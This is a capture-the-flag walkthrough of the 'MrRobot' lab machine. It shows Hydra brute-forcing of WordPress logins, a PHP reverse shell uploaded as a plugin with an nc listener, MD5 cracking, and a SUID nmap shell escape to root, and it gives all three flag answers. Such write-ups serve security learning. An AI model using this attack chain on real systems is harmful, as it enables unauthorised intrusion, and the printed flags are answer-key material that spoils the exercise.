# MrRobot
---

## *enumeration*


### open ports:
- 80    (http)
- 443   (ssl/http)

### robots.txt:
- fsocity.dic
- key-1-of-3.txt => 073403c8a58a1f80d943455fb30724b9

### "What is key 1?"

==> **073403c8a58a1f80d943455fb30724b9**


## *exploitation*

### hydra login bruteforce:
```bash
hydra -L fsocity.dic -p test $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```

>>*// use fsocity.dic as login(username) list with password 'test' to find valid username*

=> login: Elliot

```bash
hydra -l Elliot -P fsocity.dic $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```

>> *// use fsocity.dic as password list with user Elliot*

=> password: ER28-0652

### reverse shell
```bash
vim revshell.php                # create php reverse shell
7z a rsplugin.zip revshell.php  # zip php file
nc -lnvp 1234
```

On http://$IP/wp-admin/plugins.php \
-> Add New \
-> Upload Plugin \
-> Select rsplugin.zip & Install Now \
-> Activate Plugin

## *privesc*
```bash
# reverse shell
cat /home/robot/password.raw-md5 # -> robot.md5

# attacker shell
hashcat -a0 -m0 robot.md5 /opt/wordlists/passwords/rockyou.txt # -> abcdefghijklmnopqrstuvwxyz

# reverse shell
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py # required to use 'su'

su robot
# Password: abcdefghijklmnopqrstuvwxyz

cat ~/key-2-of-3.txt # -> 822c73956184f694993bede3eb39f959
```

### "What is key 2?"

==> **822c73956184f694993bede3eb39f959**


## *more privesc*
```bash
# find files with sticky bit set
find / -type f -perm +6000 2>/dev/null # -> /usr/local/bin/nmap

/usr/local/bin/nmap --interactive
    !sh
    cat /root/key-3-of-3.txt # -> 04787ddef27c3dee1ee161b21670b4e4
```

### "What is key 3?"

==> **04787ddef27c3dee1ee161b21670b4e4**
